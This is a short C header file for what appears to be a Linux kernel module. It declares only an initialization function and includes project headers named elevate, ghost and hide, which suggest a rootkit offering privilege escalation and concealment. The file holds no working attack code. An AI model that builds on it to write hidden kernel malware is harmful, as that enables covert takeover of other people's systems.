/*
Copyright (C) 2019 Bailey Defino
<https://bdefino.github.io>

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/
#ifndef IFACE_H
#define IFACE_H

#include <linux/errno.h>
#include <linux/printk.h>//////////////////////debugging

#include "elevate.h"
#include "ghost.h"
#include "hide.h"
#include "sctm.h"

/* global interface */

/* initialization */
int iface_init(void);

#endif

